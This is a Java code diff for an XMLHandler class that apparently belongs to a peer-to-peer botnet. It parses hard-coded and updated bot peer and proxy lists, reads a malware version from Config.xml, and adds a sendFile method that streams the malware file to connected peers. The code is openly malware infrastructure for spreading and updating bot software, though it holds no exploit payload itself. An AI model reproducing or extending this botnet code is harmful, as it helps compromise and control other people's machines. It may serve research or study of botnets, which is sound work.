@@ -1,9 +1,13 @@
+import java.io.BufferedInputStream;
 import java.io.BufferedOutputStream;
 import java.io.BufferedWriter;
 import java.io.ByteArrayOutputStream;
 import java.io.File;
+import java.io.FileInputStream;
+import java.io.FileNotFoundException;
 import java.io.FileOutputStream;
 import java.io.IOException;
+import java.io.ObjectOutputStream;
 import java.io.OutputStreamWriter;
 import java.io.Writer;
 import java.util.HashMap;
@@ -34,6 +38,14 @@ public class XMLHandler {
 
 	public XMLHandler(LogWriter log) {
 		this.log = log;
+		instantiateInfoDocument();
+	}
+
+	public XMLHandler(LogWriter log, String aux) {
+		this.log = log;
+		infoPath = aux + "\\Info.xml";
+		malwarePath = aux + "\\Config.xml";
+		peerListPath = aux + "\\PeerList.xml";
 		instantiateInfoDocument();
 	}
 
@@ -147,30 +159,42 @@ public class XMLHandler {
 		String port = e.getElementsByTagName("port").item(0).getTextContent();
 		String host = e.getElementsByTagName("host").item(0).getTextContent();
 		log.addLogEntry("Peer " + id + ", Port:" + port + ", Host:" + host
-				+ " was added to the peer table");
+				+ " it is my peer info");
 		return new Peer(port, host);
+	}
+	/*
+	 * get my id
+	 */
+	public int getMyId() {
+		NodeList connectionList = infoDocument
+				.getElementsByTagName("connection");
+		Node peer = connectionList.item(0);
+		Element e = (Element) peer;
+		String id = e.getAttribute("id");
+		return Integer.valueOf(id);
 	}
 
 	/*
 	 * get version from xml
 	 */
 	public int getVersion() {
-		NodeList connectionList = infoDocument
-				.getElementsByTagName("connection");
+		instantiateMalwareDocument();
+		NodeList malware = malwareDocument.getElementsByTagName("malwareInfo");
 
-		if (connectionList.getLength() == 0) {
-			log.addLogEntry("Connection info is missing");
+		if (malware.getLength() == 0) {
+			log.addLogEntry("Malware Info is missing");
 			System.exit(1);
 		}
 
-		log.addLogEntry("Connection info found");
+		log.addLogEntry("Malware info found");
 
-		Node peer = connectionList.item(0);
+		Node peer = malware.item(0);
 		if (peer.getNodeType() != Node.ELEMENT_NODE) {
 			System.exit(1);
 		}
 		Element e = (Element) peer;
-		String version = e.getAttribute("version");
+		String version = e.getElementsByTagName("version").item(0)
+				.getTextContent();
 		return Integer.parseInt(version);
 	}
 
@@ -179,44 +203,48 @@ public class XMLHandler {
 	 */
 	public HashMap<Integer, Peer> getHardcodedPeerList() {
 		NodeList peerList = infoDocument.getElementsByTagName("peerBot");
+		if (peerList.getLength() == 0) {
+			log.addLogEntry("Peer Table is empty");
+			System.exit(1);
+		}
 		return getPeers(peerList);
-		
 	}
 
 	/*
 	 * Get list of peers from peerDocument xml
 	 */
 	public HashMap<Integer, Peer> getUpdatedPeerList() {
+		instantiatePeerDocument();
 		NodeList peerList = peerDocument.getElementsByTagName("peerBot");
+		if (peerList.getLength() == 0) {
+			log.addLogEntry("Peer Table is empty");
+			return null;
+		}
 		return getPeers(peerList);
 	}
 
 	public HashMap<Integer, Peer> getPeers(NodeList peerList) {
 		HashMap<Integer, Peer> peersTable = new HashMap<Integer, Peer>();
-		if (peerList.getLength() == 0) {
-			log.addLogEntry("Peer Table is empty");
-			System.exit(1);
-			for (int i = 0; i < peerList.getLength(); i++) {
-				Node peer = peerList.item(i);
-				if (peer.getNodeType() != Node.ELEMENT_NODE) {
-					System.exit(1);
-				}
-				Element e = (Element) peer;
-				String id = e.getAttribute("id");
-				String port = e.getElementsByTagName("port").item(0)
-						.getTextContent();
-				String host = e.getElementsByTagName("host").item(0)
-						.getTextContent();
-				log.addLogEntry("Peer " + id + ", " + port + "," + host
-						+ "added to the peer table");
-				Peer nPeer = new Peer(port, host);
-				peersTable.put(Integer.parseInt(id), nPeer);
+		for (int i = 0; i < peerList.getLength(); i++) {
+			Node peer = peerList.item(i);
+			if (peer.getNodeType() != Node.ELEMENT_NODE) {
+				System.exit(1);
 			}
+			Element e = (Element) peer;
+			String id = e.getAttribute("id");
+			String port = e.getElementsByTagName("port").item(0)
+					.getTextContent();
+			String host = e.getElementsByTagName("host").item(0)
+					.getTextContent();
+			log.addLogEntry("Peer " + id + ", " + port + "," + host
+					+ "added to the peer table");
+			Peer nPeer = new Peer(port, host);
+			peersTable.put(Integer.parseInt(id), nPeer);
 		}
+
 		return peersTable;
 
 	}
-
 
 	/*
 	 * Get list of proxy peers from xml
@@ -227,23 +255,22 @@ public class XMLHandler {
 		NodeList peerList = infoDocument.getElementsByTagName("proxyBot");
 		if (peerList.getLength() == 0) {
 			log.addLogEntry("Proxy Table is empty");
-			System.exit(1);
-			for (int i = 0; i < peerList.getLength(); i++) {
-				Node peer = peerList.item(i);
-				if (peer.getNodeType() != Node.ELEMENT_NODE) {
-					System.exit(1);
-				}
-				Element e = (Element) peer;
-				String id = e.getAttribute("id");
-				String port = e.getElementsByTagName("port").item(0)
-						.getTextContent();
-				String host = e.getElementsByTagName("host").item(0)
-						.getTextContent();
-				log.addLogEntry("Peer " + id + ", " + port + "," + host
-						+ "added to the proxy table");
-				Peer nPeer = new Peer(port, host);
-				proxiesTable.put(Integer.parseInt(id), nPeer);
+		}
+		for (int i = 0; i < peerList.getLength(); i++) {
+			Node peer = peerList.item(i);
+			if (peer.getNodeType() != Node.ELEMENT_NODE) {
+				System.exit(1);
 			}
+			Element e = (Element) peer;
+			String id = e.getAttribute("id");
+			String port = e.getElementsByTagName("port").item(0)
+					.getTextContent();
+			String host = e.getElementsByTagName("host").item(0)
+					.getTextContent();
+			log.addLogEntry("Peer " + id + ", " + port + "," + host
+					+ "added to the proxy table");
+			Peer nPeer = new Peer(port, host);
+			proxiesTable.put(Integer.parseInt(id), nPeer);
 		}
 		return proxiesTable;
 	}
@@ -281,5 +308,28 @@ public class XMLHandler {
 			} catch (Exception ex) {
 			}
 		}
+	}
+
+	public void sendFile(ObjectOutputStream outStream) {
+		File myFile = new File(malwarePath);
+		byte[] mybytearray = new byte[(int) myFile.length()];
+
+		FileInputStream fis = null;
+
+		try {
+			fis = new FileInputStream(myFile);
+		} catch (FileNotFoundException ex) {
+			// Do exception handling
+		}
+		BufferedInputStream bis = new BufferedInputStream(fis);
+
+		try {
+			bis.read(mybytearray, 0, mybytearray.length);
+			outStream.write(mybytearray, 0, mybytearray.length);
+			outStream.flush();
+		} catch (IOException ex) {
+			// Do exception handling
+		}
+
 	}
 }
